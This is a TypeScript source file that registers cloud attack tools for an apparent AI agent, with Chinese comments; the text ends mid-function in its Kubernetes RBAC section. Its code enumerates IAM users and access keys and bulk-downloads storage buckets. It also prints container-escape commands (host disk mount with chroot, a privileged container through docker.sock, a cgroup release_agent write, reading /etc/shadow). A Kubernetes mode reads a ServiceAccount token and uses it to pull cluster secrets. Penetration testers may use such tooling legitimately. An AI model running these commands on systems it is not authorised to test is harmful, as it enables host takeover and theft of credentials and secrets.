import { z } from "zod";
import * as fs from "fs";
import * as path from "path";
import * as child_process from "child_process";
import { ToolRegistry } from "./registry";

/**
 * 检测系统命令是否已安装（通过 `which`）。
 * execSync 在命令不存在时退出码非 0 会抛异常，包一层 try-catch。
 */
function isInstalled(cmd: string): boolean {
  try {
    child_process.execSync(`which ${cmd}`, { encoding: "utf-8", timeout: 3000, stdio: "pipe" });
    return true;
  } catch {
    return false;
  }
}

/**
 * 执行 shell 命令，统一捕获异常，返回结构化结果。
 * 失败时 execSync 抛出的 err 对象上挂载 stdout/stderr。
 */
function run(cmd: string, timeoutMs = 15000): { ok: boolean; stdout: string; stderr: string; code: number | null } {
  try {
    const stdout = child_process.execSync(cmd, {
      timeout: timeoutMs,
      maxBuffer: 1024 * 1024,
      encoding: "utf-8",
      stdio: "pipe",
    });
    return { ok: true, stdout: stdout || "", stderr: "", code: 0 };
  } catch (err: any) {
    return {
      ok: false,
      stdout: (err.stdout as string) || "",
      stderr: (err.stderr as string) || (err.message as string) || "",
      code: err.status ?? null,
    };
  }
}

/**
 * 解码 /proc/1/status 的 CapEff 位掩码，返回启用的危险 capabilities。
 */
function decodeCaps(hex: string): string[] {
  // Linux capability 位号
  const capNames: Record<number, string> = {
    0: "CAP_CHOWN",
    1: "CAP_DAC_OVERRIDE",
    2: "CAP_DAC_READ_SEARCH",
    3: "CAP_FOWNER",
    4: "CAP_FSETID",
    5: "CAP_KILL",
    6: "CAP_SETGID",
    7: "CAP_SETUID",
    8: "CAP_SETPCAP",
    9: "CAP_LINUX_IMMUTABLE",
    10: "CAP_NET_BIND_SERVICE",
    11: "CAP_NET_BROADCAST",
    12: "CAP_NET_ADMIN",
    13: "CAP_NET_RAW",
    14: "CAP_IPC_LOCK",
    15: "CAP_IPC_OWNER",
    16: "CAP_SYS_MODULE",
    17: "CAP_SYS_RAWIO",
    18: "CAP_SYS_CHROOT",
    19: "CAP_SYS_PTRACE",
    20: "CAP_SYS_PACCT",
    21: "CAP_SYS_ADMIN",
    22: "CAP_SYS_BOOT",
    23: "CAP_SYS_NICE",
    24: "CAP_SYS_RESOURCE",
    25: "CAP_SYS_TIME",
    26: "CAP_SYS_TTY_CONFIG",
    27: "CAP_MKNOD",
    28: "CAP_LEASE",
    29: "CAP_AUDIT_WRITE",
    30: "CAP_AUDIT_CONTROL",
    31: "CAP_SETFCAP",
    32: "CAP_MAC_OVERRIDE",
    33: "CAP_MAC_ADMIN",
    34: "CAP_SYSLOG",
    35: "CAP_WAKE_ALARM",
    36: "CAP_BLOCK_SUSPEND",
    37: "CAP_AUDIT_READ",
    38: "CAP_PERFMON",
    39: "CAP_BPF",
    40: "CAP_CHECKPOINT_RESTORE",
  };
  const dangerous = [21, 19, 16, 17, 22, 12, 24, 27, 1, 2, 8, 33];
  const enabled: string[] = [];
  let bits: bigint;
  try {
    bits = BigInt(hex.startsWith("0x") ? hex : "0x" + hex);
  } catch {
    return enabled;
  }
  for (const bit of dangerous) {
    if ((bits >> BigInt(bit)) & 1n) {
      enabled.push(capNames[bit] || `CAP_${bit}`);
    }
  }
  return enabled;
}

export function createCloudTools(): ToolRegistry {
  const registry = new ToolRegistry();

  // ============================================================
  // 1. iam_enum — IAM 枚举
  // ============================================================
  registry.register({
    name: "iam_enum",
    description: "云 IAM 枚举：列举 AWS/Aliyun/Azure/GCP 的用户、角色、策略、访问密钥",
    parameters: z.object({
      provider: z.enum(["aws", "aliyun", "azure", "gcp"]).optional().describe("云服务商，默认 aws"),
      profile: z.string().optional().describe("凭证 profile 名（如 ~/.aws/credentials 中的 profile）"),
      mode: z.enum(["users", "roles", "policies", "keys", "all"]).optional().describe("枚举模式，默认 all"),
      region: z.string().optional().describe("区域，如 us-east-1"),
    }),
    category: "cloud",
    concurrent: true,
    execute: async (args: any) => {
      const provider = args.provider || "aws";
      const profile = args.profile;
      const mode = args.mode || "all";
      const region = args.region;
      const out: string[] = [];
      out.push(
        `[IAM 枚举] provider=${provider} mode=${mode}${profile ? " profile=" + profile : ""}${region ? " region=" + region : ""}`,
      );
      out.push("─".repeat(60));

      const want = (m: string) => mode === "all" || mode === m;

      if (provider === "aws") {
        if (!isInstalled("aws")) {
          return (
            out.join("\n") +
            "\n⚠️  未检测到 aws CLI（aws-cli）。\n" +
            "  安装方式：\n" +
            "    macOS : brew install awscli\n" +
            "    Ubuntu/Debian: sudo apt install awscli\n" +
            "    RHEL/CentOS : sudo yum install awscli\n" +
            "    通用        : pip install awscli\n" +
            "  配置凭证：aws configure（写入 AK/SK/region）或 export AWS_PROFILE=<profile>\n" +
            "  手动检查指引：登录 AWS 控制台 → IAM → Users/Roles/Policies 逐一查看；\n" +
            "    或用 AWSCloudShell 运行：aws iam list-users / list-roles / list-policies"
          );
        }
        const opt = `${profile ? "--profile " + profile : ""} ${region ? "--region " + region : ""}`.trim();
        const cmds: Array<[string, string]> = [];
        if (want("users")) cmds.push(["users", `aws iam list-users ${opt} --output json`]);
        if (want("roles")) cmds.push(["roles", `aws iam list-roles ${opt} --output json`]);
        if (want("policies")) cmds.push(["policies", `aws iam list-policies ${opt} --scope Local --output json`]);
        if (want("keys")) cmds.push(["access-keys", `aws iam list-access-keys ${opt} --output json`]);

        for (const [label, cmd] of cmds) {
          const r = run(cmd);
          out.push(`\n■ ${label}`);
          if (r.ok) {
            try {
              const obj = JSON.parse(r.stdout);
              // list-roles 返回 Roles，list-users 返回 Users，list-policies 返回 Policies，list-access-keys 返回 AccessKeyMetadata
              const key = Object.keys(obj)[0];
              const arr: any[] = obj[key] || [];
              out.push(`  共 ${arr.length} 条：`);
              for (const item of arr.slice(0, 50)) {
                const name = item.UserName || item.RoleName || item.PolicyName || item.AccessKeyId || JSON.stringify(item);
                const extra = item.CreateDate ? ` (创建于 ${item.CreateDate})` : "";
                out.push(`    • ${name}${extra}`);
              }
              if (arr.length > 50) out.push(`    ... 还有 ${arr.length - 50} 条`);
            } catch {
              out.push("  " + r.stdout.slice(0, 1500));
            }
          } else {
            out.push(`  ❌ 失败: ${r.stderr.slice(0, 300)}`);
          }
        }
        return out.join("\n");
      }

      if (provider === "aliyun") {
        if (!isInstalled("aliyun")) {
          return (
            out.join("\n") +
            "\n⚠️  未检测到 aliyun CLI。\n" +
            "  安装方式：\n" +
            "    macOS: brew install aliyun-cli\n" +
            "    通用  : 下载 https://github.com/aliyun/aliyun-cli/releases\n" +
            "  配置凭证：aliyun configure（写入 AccessKey ID/Secret/region）\n" +
            "  手动检查指引：登录 RAM 控制台 https://ram.console.aliyun.com → 用户/角色/权限策略"
          );
        }
        const cmds: Array<[string, string]> = [];
        if (want("users")) cmds.push(["users", `aliyun ram ListUsers`]);
        if (want("roles")) cmds.push(["roles", `aliyun ram ListRoles`]);
        if (want("policies")) cmds.push(["policies", `aliyun ram ListPolicies`]);
        if (want("keys")) cmds.push(["access-keys", `aliyun ram ListAccessKeys`]);

        for (const [label, cmd] of cmds) {
          const r = run(cmd);
          out.push(`\n■ ${label}`);
          if (r.ok) {
            out.push("  " + r.stdout.slice(0, 1500));
          } else {
            out.push(`  ❌ 失败: ${r.stderr.slice(0, 300)}`);
          }
        }
        return out.join("\n");
      }

      if (provider === "azure") {
        if (!isInstalled("az")) {
          return (
            out.join("\n") +
            "\n⚠️  未检测到 az CLI（azure-cli）。\n" +
            "  安装方式：\n" +
            "    macOS: brew install azure-cli\n" +
            "    通用  : 参考 https://docs.microsoft.com/cli/azure/install-azure-cli\n" +
            "  配置凭证：az login\n" +
            "  手动检查指引：Azure Portal → Azure AD → Users / Roles"
          );
        }
        const cmds: Array<[string, string]> = [];
        if (want("users")) cmds.push(["users", `az ad user list --query "[].{name:displayName,upn:userPrincipalName}" -o json`]);
        if (want("roles")) cmds.push(["role-definitions", `az role definition list -o json`]);
        if (want("policies")) cmds.push(["role-assignments", `az role assignment list -o json`]);
        for (const [label, cmd] of cmds) {
          const r = run(cmd);
          out.push(`\n■ ${label}`);
          if (r.ok) out.push("  " + r.stdout.slice(0, 1500));
          else out.push(`  ❌ 失败: ${r.stderr.slice(0, 300)}`);
        }
        return out.join("\n");
      }

      if (provider === "gcp") {
        if (!isInstalled("gcloud")) {
          return (
            out.join("\n") +
            "\n⚠️  未检测到 gcloud CLI（Google Cloud SDK）。\n" +
            "  安装方式：\n" +
            "    macOS: brew install google-cloud-sdk\n" +
            "    通用  : 参考 https://cloud.google.com/sdk/docs/install\n" +
            "  配置凭证：gcloud auth login && gcloud config set project <PROJECT_ID>\n" +
            "  手动检查指引：GCP Console → IAM & Admin → IAM / Service Accounts"
          );
        }
        const cmds: Array<[string, string]> = [];
        if (want("users")) cmds.push(["service-accounts", `gcloud iam service-accounts list --format=json`]);
        if (want("roles")) cmds.push(["roles", `gcloud iam roles list --format=json`]);
        if (want("policies")) cmds.push(["iam-policy", `gcloud projects get-iam-policy --format=json`]);
        if (want("keys")) cmds.push(["keys", `gcloud iam service-accounts keys list --format=json`]);
        for (const [label, cmd] of cmds) {
          const r = run(cmd);
          out.push(`\n■ ${label}`);
          if (r.ok) out.push("  " + r.stdout.slice(0, 1500));
          else out.push(`  ❌ 失败: ${r.stderr.slice(0, 300)}`);
        }
        return out.join("\n");
      }

      return out.join("\n") + `\n❌ 不支持的 provider: ${provider}`;
    },
  });

  // ============================================================
  // 2. s3_bucket_scan — 对象存储 Bucket 枚举与权限检测
  // ============================================================
  registry.register({
    name: "s3_bucket_scan",
    description: "对象存储 Bucket 枚举与权限检测：列举对象、检查策略/ACL、测试匿名访问、下载对象",
    parameters: z.object({
      provider: z.enum(["aws", "aliyun", "tencent", "auto"]).optional().describe("云服务商，默认 aws"),
      bucket_name: z.string().optional().describe("指定 bucket 名，未指定时列举所有 bucket"),
      prefix: z.string().optional().describe("对象前缀，用于限定列举范围"),
      mode: z.enum(["list", "perms", "public", "download", "all"]).optional().describe("检测模式，默认 all"),
      region: z.string().optional().describe("区域"),
    }),
    category: "cloud",
    concurrent: true,
    execute: async (args: any) => {
      const provider = args.provider || "aws";
      const bucket = args.bucket_name;
      const prefix = args.prefix || "";
      const mode = args.mode || "all";
      const region = args.region;
      const out: string[] = [];
      out.push(
        `[Bucket 扫描] provider=${provider} mode=${mode}${bucket ? " bucket=" + bucket : ""}${prefix ? " prefix=" + prefix : ""}${region ? " region=" + region : ""}`,
      );
      out.push("─".repeat(60));

      const want = (m: string) => mode === "all" || mode === m;

      if (!isInstalled("aws") && !isInstalled("aliyun") && !isInstalled("cos")) {
        return (
          out.join("\n") +
          "\n⚠️  未检测到对象存储相关 CLI（aws / aliyun / cos）。\n" +
          "  AWS    : brew install awscli / pip install awscli\n" +
          "  Aliyun : brew install aliyun-cli\n" +
          "  Tencent: pip install coscmd / coscli\n" +
          "  手动检查指引：登录对应控制台 → 对象存储 OSS/S3/COS → Bucket 列表与权限"
        );
      }

      // 不指定 bucket 时先列举所有 bucket
      let targetBucket = bucket;
      if (!targetBucket && want("list") && isInstalled("aws")) {
        const opt = `${region ? "--region " + region : ""}`.trim();
        const r = run(`aws s3 ls ${opt}`);
        out.push("\n■ bucket 列表");
        if (r.ok) {
          out.push(r.stdout.slice(0, 2000) || "  (空)");
        } else {
          out.push(`  ❌ 失败: ${r.stderr.slice(0, 300)}`);
        }
        return out.join("\n");
      }

      if (!targetBucket) {
        return out.join("\n") + "\n❌ 需要指定 bucket_name（或 mode=list 自动列举全部 bucket）";
      }

      if (want("list")) {
        const r = run(`aws s3 ls s3://${targetBucket}/${prefix} ${region ? "--region " + region : ""}`.trim());
        out.push("\n■ 对象列表");
        if (r.ok) out.push(r.stdout.slice(0, 2000) || "  (空 bucket)");
        else out.push(`  ❌ 失败: ${r.stderr.slice(0, 300)}`);
      }

      if (want("perms")) {
        const opt = `--bucket ${targetBucket} ${region ? "--region " + region : ""}`.trim();
        out.push("\n■ 权限检测");
        const policy = run(`aws s3api get-bucket-policy ${opt} --output json`);
        if (policy.ok) {
          out.push("  Bucket Policy:");
          try {
            const obj = JSON.parse(JSON.parse(policy.stdout).Policy);
            out.push("  " + JSON.stringify(obj, null, 2).slice(0, 1200));
            if (policy.stdout.includes("0.0.0.0/0") || policy.stdout.includes('"AWS": "*"') || /public/i.test(policy.stdout)) {
              out.push("  ⚠️ 策略中包含公开(*)或 0.0.0.0/0，存在公开访问风险！");
            }
          } catch {
            out.push("  " + policy.stdout.slice(0, 800));
          }
        } else {
          out.push(`  Bucket Policy: (无策略或读取失败) ${policy.stderr.slice(0, 150)}`);
        }
        const acl = run(`aws s3api get-bucket-acl ${opt} --output json`);
        if (acl.ok) {
          out.push("  Bucket ACL:");
          if (acl.stdout.includes("AllUsers") || acl.stdout.includes("acs.amazonaws.com/groups/global/AllUsers")) {
            out.push("  ⚠️ ACL 包含 AllUsers（公开访问）！");
          }
          out.push("  " + acl.stdout.slice(0, 800));
        } else {
          out.push(`  Bucket ACL: (读取失败) ${acl.stderr.slice(0, 150)}`);
        }
      }

      if (want("public")) {
        out.push("\n■ 匿名访问测试");
        const url = `https://${targetBucket}.s3.amazonaws.com/`;
        const r = run(`curl -s -o /dev/null -w "%{http_code}" "${url}"`, 15000);
        out.push(`  GET ${url}`);
        if (r.ok) {
          const code = r.stdout.trim();
          out.push(`  HTTP 状态码: ${code}`);
          if (code === "200") out.push("  ⚠️ Bucket 可匿名访问（公开）！");
          else if (code === "403") out.push("  ✅ 返回 403，匿名访问被拒绝");
          else if (code === "404") out.push("  ℹ️ 返回 404，Bucket 不存在");
          else out.push(`  ℹ️ 其他状态: ${code}`);
        } else {
          out.push(`  ❌ curl 失败: ${r.stderr.slice(0, 200)}`);
        }
        const r2 = run(`curl -s "${url}"`, 15000);
        if (r2.ok && r2.stdout) out.push("  响应预览: " + r2.stdout.slice(0, 400));
      }

      if (want("download")) {
        out.push("\n■ 下载对象");
        const r = run(`aws s3 cp s3://${targetBucket}/${prefix} ./${targetBucket}_download/ --recursive ${region ? "--region " + region : ""}`.trim());
        if (r.ok) out.push("  下载完成:\n" + r.stdout.slice(0, 800));
        else out.push(`  ❌ 下载失败: ${r.stderr.slice(0, 300)}`);
      }

      return out.join("\n");
    },
  });

  // ============================================================
  // 3. container_escape_test — 容器逃逸测试
  // ============================================================
  registry.register({
    name: "container_escape_test",
    description: "容器逃逸测试：检测容器环境、privileged 模式、capabilities、sysfs/cgroup 可写性、docker.sock 挂载，并给出 PoC 命令",
    parameters: z.object({
      mode: z.enum(["check", "privileged", "capabilities", "sysfs", "cgroup", "mount", "all"]).optional().describe("检测模式，默认 check"),
      container_id: z.string().optional().describe("容器 ID（用于检查指定容器，可选）"),
      output_dir: z.string().optional().describe("PoC 输出目录，可选"),
    }),
    category: "cloud",
    requirePermission: true,
    execute: async (args: any) => {
      const mode = args.mode || "check";
      const containerId = args.container_id;
      const outputDir = args.output_dir;
      const out: string[] = [];
      out.push(`[容器逃逸测试] mode=${mode}${containerId ? " container=" + containerId : ""}`);
      out.push("─".repeat(60));

      const want = (m: string) => mode === "all" || mode === m;
      const risks: string[] = [];

      // mode=check: 是否在容器内
      if (want("check")) {
        out.push("\n■ 容器环境检测");
        const dockerenv = fs.existsSync("/.dockerenv");
        out.push(`  /.dockerenv 存在: ${dockerenv ? "✅ 是（Docker 容器）" : "❌ 否"}`);
        let cgroup = "";
        try {
          cgroup = fs.readFileSync("/proc/1/cgroup", "utf-8");
          out.push("  /proc/1/cgroup:");
          out.push("  " + cgroup.split("\n").slice(0, 10).join("\n  "));
          if (/docker|kubepods|containerd/.test(cgroup)) {
            risks.push("cgroup 显示运行在容器内（docker/kubepods/containerd）");
            out.push("  ⚠️ cgroup 指示容器环境");
          }
        } catch (err: any) {
          out.push(`  /proc/1/cgroup 读取失败: ${err.message}`);
        }
        if (!dockerenv && !/docker|kubepods|containerd/.test(cgroup)) {
          out.push("  ℹ️ 当前可能不在容器内（继续检测仍可能有逃逸面）");
        }
      }

      // mode=privileged: privileged 模式
      if (want("privileged")) {
        out.push("\n■ Privileged 模式检测");
        const r = run("dmesg 2>&1 | head -n 5", 8000);
        if (r.ok && r.stdout && !/Operation not permitted|Permission denied/i.test(r.stderr + r.stdout)) {
          risks.push("dmesg 可访问，容器可能运行在 privileged 模式");
          out.push("  ⚠️ dmesg 可访问，疑似 privileged 容器");
          out.push("  dmesg 输出预览:\n  " + r.stdout.slice(0, 400));
        } else {
          out.push("  ✅ dmesg 不可访问（Operation not permitted），非 privileged");
        }
        // 检查 /dev 是否完整
        const dev = fs.existsSync("/dev/mem") || fs.existsSync("/dev/sda");
        if (dev) {
          risks.push("可访问宿主设备节点（/dev/mem、/dev/sda 等）");
          out.push("  ⚠️ 检测到宿主设备节点，疑似 privileged");
        }
      }

      // mode=capabilities: capabilities 分析
      if (want("capabilities")) {
        out.push("\n■ Capabilities 分析");
        try {
          const status = fs.readFileSync("/proc/1/status", "utf-8");
          const capLines = status.split("\n").filter((l) => /^Cap/i.test(l));
          out.push("  " + capLines.join("\n  "));
          const capEff = capLines.find((l) => /^CapEff/i.test(l));
          if (capEff) {
            const hex = capEff.split(/\s+/).pop() || "0";
            const caps = decodeCaps(hex);
            out.push(`  CapEff(0x${hex}) 启用的危险 capabilities (${caps.length}):`);
            caps.forEach((c) => out.push("    • " + c));
            if (caps.includes("CAP_SYS_ADMIN")) {
              risks.push("CAP_SYS_ADMIN 启用，容器权限过高，逃逸可能性高");
              out.push("  ⚠️ CAP_SYS_ADMIN 启用 → 高风险逃逸面");
            }
            if (caps.includes("CAP_SYS_PTRACE")) risks.push("CAP_SYS_PTRACE 启用，可注入宿主进程");
            if (caps.includes("CAP_SYS_MODULE")) risks.push("CAP_SYS_MODULE 启用，可加载内核模块");
            if (caps.includes("CAP_SYS_BOOT")) risks.push("CAP_SYS_BOOT 启用，可重启宿主");
            if (caps.includes("CAP_SYS_ADMIN") || caps.includes("CAP_SYS_MODULE") || caps.includes("CAP_SYS_PTRACE")) {
              out.push("  ⚠️ 检测到高危 capabilities，逃逸风险显著");
            }
          }
        } catch (err: any) {
          out.push(`  ❌ 读取 /proc/1/status 失败: ${err.message}`);
        }
      }

      // mode=sysfs: /sys 可写性
      if (want("sysfs")) {
        out.push("\n■ /sys 可写性检测");
        let writable = false;
        try {
          fs.accessSync("/sys/fs/cgroup", fs.constants.W_OK);
          writable = true;
        } catch {}
        // 尝试写一个临时文件作为 PoC
        let sysWritable = false;
        try {
          fs.accessSync("/sys", fs.constants.W_OK);
          sysWritable = true;
        } catch {}
        out.push(`  /sys 可写: ${sysWritable ? "⚠️ 是" : "✅ 否"}`);
        out.push(`  /sys/fs/cgroup 可写: ${writable ? "⚠️ 是" : "✅ 否"}`);
        if (sysWritable || writable) {
          risks.push("/sys 或 /sys/fs/cgroup 可写，可利用 sysfs 进行逃逸");
        }
      }

      // mode=cgroup: cgroup release_agent 可写性
      if (want("cgroup")) {
        out.push("\n■ cgroup release_agent 检测");
        const releaseAgent = "/sys/fs/cgroup/release_agent";
        const notify = "/sys/fs/cgroup/notify_on_release";
        const raExists = fs.existsSync(releaseAgent);
        const nExists = fs.existsSync(notify);
        out.push(`  release_agent (${releaseAgent}) 存在: ${raExists ? "是" : "否"}`);
        out.push(`  notify_on_release (${notify}) 存在: ${nExists ? "是" : "否"}`);
        let raWritable = false;
        if (raExists) {
          try {
            fs.accessSync(releaseAgent, fs.constants.W_OK);
            raWritable = true;
          } catch {}
        }
        if (raWritable) {
          risks.push("cgroup release_agent 可写，可触发宿主命令执行");
          out.push("  ⚠️ release_agent 可写！可写入宿主命令实现逃逸");
        }
        // 检查 cgroup v1 的挂载点
        const r = run("mount | grep cgroup", 5000);
        if (r.ok) out.push("  cgroup 挂载:\n  " + r.stdout.split("\n").slice(0, 6).join("\n  "));
      }

      // mode=mount: docker.sock 是否挂载
      if (want("mount")) {
        out.push("\n■ docker.sock 挂载检测");
        const dockerSock = "/var/run/docker.sock";
        const exists = fs.existsSync(dockerSock);
        out.push(`  /var/run/docker.sock 存在: ${exists ? "⚠️ 是" : "✅ 否"}`);
        if (exists) {
          risks.push("docker.sock 已挂载，可通过 Docker API 逃逸控制宿主");
          out.push("  ⚠️ docker.sock 已挂载！可调用 Docker API 启动特权容器逃逸");
        }
        const r = run("mount | grep -E 'docker.sock|/host|/var/lib/docker'", 5000);
        if (r.ok) out.push("  相关挂载:\n  " + r.stdout.slice(0, 500) || "  (无)");
        // 检查 /host 或 /hostfs 整盘挂载
        const hostMount = fs.existsSync("/host") || fs.existsSync("/hostfs");
        if (hostMount) {
          risks.push("检测到宿主文件系统挂载（/host 或 /hostfs）");
          out.push("  ⚠️ 检测到宿主文件系统挂载（/host 或 /hostfs），可直接读写宿主");
        }
      }

      // 风险汇总 + PoC 命令
      out.push("\n" + "─".repeat(60));
      out.push(`■ 逃逸风险评估（共 ${risks.length} 项风险）`);
      if (risks.length === 0) {
        out.push("  ✅ 未检测到明显逃逸风险");
      } else {
        risks.forEach((r, i) => out.push(`  ${i + 1}. ${r}`));
      }

      out.push("\n■ PoC 命令参考");
      const pocs: string[] = [];
      if (risks.some((r) => r.includes("CAP_SYS_ADMIN"))) {
        pocs.push("# 利用 CAP_SYS_ADMIN 挂载宿主磁盘\n  mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host /bin/bash");
      }
      if (risks.some((r) => r.includes("docker.sock"))) {
        pocs.push("# 利用 docker.sock 启动特权容器\n  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json\n  docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host /bin/bash");
      }
      if (risks.some((r) => r.includes("release_agent"))) {
        pocs.push("# 利用 cgroup release_agent 执行宿主命令\n  echo '/tmp/pwn.sh' > /sys/fs/cgroup/release_agent && echo 1 > /sys/fs/cgroup/notify_on_release");
      }
      if (risks.some((r) => r.includes("宿主文件系统挂载"))) {
        pocs.push("# 直接读写宿主文件系统\n  ls -la /host && cat /host/etc/shadow");
      }
      if (pocs.length === 0) pocs.push("  (未发现可直接利用的逃逸路径)");
      pocs.forEach((p) => out.push("  " + p));

      if (outputDir) {
        if (!fs.existsSync(outputDir)) {
          try {
            fs.mkdirSync(outputDir, { recursive: true });
          } catch {}
        }
        if (fs.existsSync(outputDir)) {
          const reportPath = path.join(outputDir, "container_escape_report.txt");
          try {
            fs.writeFileSync(reportPath, out.join("\n"), "utf-8");
            out.push(`\n📄 报告已保存: ${reportPath}`);
          } catch (err: any) {
            out.push(`\n❌ 报告保存失败: ${err.message}`);
          }
        } else {
          out.push(`\n❌ 输出目录不存在且无法创建: ${outputDir}`);
        }
      }

      return out.join("\n");
    },
  });

  // ============================================================
  // 4. k8s_attack — Kubernetes 攻击
  // ============================================================
  registry.register({
    name: "k8s_attack",
    description: "Kubernetes 攻击面分析：枚举资源、Pod 逃逸、ServiceAccount 滥用、etcd 未授权、Dashboard 未授权、RBAC 权限枚举",
    parameters: z.object({
      mode: z.enum(["enum", "pod_escape", "sa_abuse", "etcd", "dashboard", "rbac", "all"]).optional().describe("攻击模式，默认 enum"),
      namespace: z.string().optional().describe("命名空间，默认 default"),
      pod_name: z.string().optional().describe("Pod 名，用于定向检查"),
      kubectl_context: z.string().optional().describe("kubectl context，可选"),
    }),
    category: "cloud",
    requirePermission: true,
    execute: async (args: any) => {
      const mode = args.mode || "enum";
      const ns = args.namespace || "default";
      const podName = args.pod_name;
      const ctx = args.kubectl_context;
      const out: string[] = [];
      out.push(`[K8s 攻击] mode=${mode} namespace=${ns}${podName ? " pod=" + podName : ""}${ctx ? " context=" + ctx : ""}`);
      out.push("─".repeat(60));

      const ctxOpt = ctx ? `--context ${ctx}` : "";
      const nsOpt = `-n ${ns}`;

      // 先检查 kubectl 是否安装
      if (!isInstalled("kubectl")) {
        return (
          out.join("\n") +
          "\n⚠️  未检测到 kubectl。\n" +
          "  安装方式：\n" +
          "    macOS: brew install kubectl\n" +
          "    通用  : 参考 https://kubernetes.io/docs/tasks/tools/\n" +
          "  配置：确保 ~/.kube/config 存在或 export KUBECONFIG=<path>\n" +
          "  手动检查指引：在集群节点上查看 /etc/kubernetes/、/var/run/secrets/；\n" +
          "    或用云厂商控制台查看集群与工作负载"
        );
      }

      const want = (m: string) => mode === "all" || mode === m;

      // mode=enum: 枚举资源
      if (want("enum")) {
        out.push("\n■ 资源枚举");
        const r = run(`kubectl get pods,svc,secrets,configmaps ${nsOpt} ${ctxOpt}`.trim());
        if (r.ok) out.push(r.stdout.slice(0, 2000) || "  (空)");
        else out.push(`  ❌ 失败: ${r.stderr.slice(0, 300)}`);
        // 枚举所有命名空间
        const r2 = run(`kubectl get namespaces ${ctxOpt}`.trim());
        if (r2.ok) {
          out.push("\n  命名空间:");
          out.push("  " + r2.stdout.slice(0, 800));
        }
      }

      // mode=pod_escape: 检查 Pod 挂载的 ServiceAccount token
      if (want("pod_escape")) {
        out.push("\n■ Pod 逃逸面检测（ServiceAccount token / 挂载）");
        // 检查本机 SA token（如果在 Pod 内）
        const saToken = "/var/run/secrets/kubernetes.io/serviceaccount/token";
        const saCa = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt";
        const saNs = "/var/run/secrets/kubernetes.io/serviceaccount/namespace";
        const tokenExists = fs.existsSync(saToken);
        out.push(`  本机 SA token (${saToken}): ${tokenExists ? "⚠️ 存在" : "✅ 不存在"}`);
        if (tokenExists) {
          try {
            const token = fs.readFileSync(saToken, "utf-8");
            out.push(`  token 预览: ${token.slice(0, 40)}...（长度 ${token.length}）`);
            out.push(`  namespace: ${fs.existsSync(saNs) ? fs.readFileSync(saNs, "utf-8").trim() : "未知"}`);
            out.push("  ⚠️ 可用此 token 直接访问 K8s API（见 sa_abuse 模式）");
          } catch (err: any) {
            out.push(`  ❌ 读取 token 失败: ${err.message}`);
          }
        }
        // 检查指定 Pod 的挂载
        if (podName) {
          const r = run(`kubectl get pod ${podName} ${nsOpt} ${ctxOpt} -o jsonpath="{.spec.containers[*].volumeMounts}"`.trim());
          if (r.ok) out.push(`\n  Pod ${podName} volumeMounts:\n  ${r.stdout.slice(0, 800)}`);
        }
      }

      // mode=sa_abuse: 用 SA token 访问 K8s API
      if (want("sa_abuse")) {
        out.push("\n■ ServiceAccount 滥用（用 token 访问 K8s API）");
        const saToken = "/var/run/secrets/kubernetes.io/serviceaccount/token";
        const saNs = "/var/run/secrets/kubernetes.io/serviceaccount/namespace";
        if (!fs.existsSync(saToken)) {
          out.push("  ℹ️ 本机无 SA token，需手动提供 token 进行测试");
          out.push("  PoC: TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)");
          out.push("       curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces");
        } else {
          const apiserver = "https://kubernetes.default.svc";
          out.push(`  目标 API: ${apiserver}`);
          const r = run(
            `TOKEN=$(cat ${saToken}); NAMESPACE=$(cat ${saNs}); ` +
              `curl -sk -H "Authorization: Bearer $TOKEN" ${apiserver}/api/v1/namespaces/$NAMESPACE/secrets`,
            15000,
          );
          if (r.ok) out.push("  secrets 访问结果:\n  " + r.stdout.slice(0, 1200));
          else out.push(`  ❌ 失败: ${r.stderr.slice(0, 300)}`);
          // 检查权限
          const r2 = run(
            `TOKEN=$(cat ${saToken}); curl -sk -H "Authorization: Bearer $TOKEN" ${apiserver}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -X POST -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"${ns}"}}'`,
            15000,
          );
          if (r2.ok) out.push("\n  当前 SA 权限:\n  " + r2.stdout.slice(0, 1200));
        }
      }

      // mode=etcd: 检查 etcd 未授权访问
      if (want("etcd")) {
        out.push("\n■ etcd 未授权访问检测");
        const targets = [
          "http://127.0.0.1:2379/v2/keys/",
          "http://127.0.0.1:2379/version",
        ];
        for (const url of targets) {
          const r = run(`curl -s --connect-timeout 5 "${url}"`, 10000);
          out.push(`  GET ${url}`);
          if (r.ok && r.stdout) {
            out.push("  " + r.stdout.slice(0, 400));
            if (!/connection refused|couldn't connect|failed/i.test(r.stdout + r.stderr)) {
              out.push("  ⚠️ etcd 可能可未授权访问！可读取集群全部密钥（含 secret）");
            }
          } else {
            out.push(`  ℹ️ 不可达: ${(r.stderr || r.stdout).slice(0, 150)}`);
          }
        }
        out.push("  PoC: curl http://<etcd-ip>:2379/v2/keys/ --recursive");
        out.push("  ⚠️ etcd v3: ETCDCTL_API=3 etcdctl --endpoints=http://<ip>:2379 get / --prefix");
      }

      // mode=dashboard: 检查 Kubernetes Dashboard 未授权
      if (want("dashboard")) {
        out.push("\n■ Kubernetes Dashboard 未授权检测");
        const r = run(`kubectl get pods --all-namespaces ${ctxOpt} | grep -i dashboard`.trim(), 8000);
        if (r.ok) out.push("  Dashboard Pod:\n  " + (r.stdout.slice(0, 600) || "  (未发现 dashboard pod)"));
        // 检查 dashboard service
        const r2 = run(`kubectl get svc --all-namespaces ${ctxOpt} | grep -i dashboard`.trim(), 8000);
        if (r2.ok) out.push("  Dashboard Service:\n  " + (r2.stdout.slice(0, 600) || "  (未发现 dashboard service)"));
        // 检查 kubeconfig 中的 token
        const r3 = run("kubectl config view --minify -o jsonpath='{.users[*].user.token}' 2>/dev/null", 5000);
        if (r3.ok && r3.stdout) out.push("  ⚠️ kubeconfig 中存在明文 token，可能被利用访问 dashboard");
        out.push("  PoC: kubectl proxy（本地 8001）→ 访问 dashboard API → 越权操作");
      }

      // mode=rbac: 枚举 RBAC 权限
      if (want("rbac")) {
        out.push("\n■ RBAC 权限枚举");
        const r = run(`kubectl auth can-i --list ${nsOpt} ${ctxOpt}`.trim(), 10000);
        if (r.ok) out.push("  当前用户在 " + ns + " 命名空间的权限:\n  " + r.stdout.slice(0, 1500));
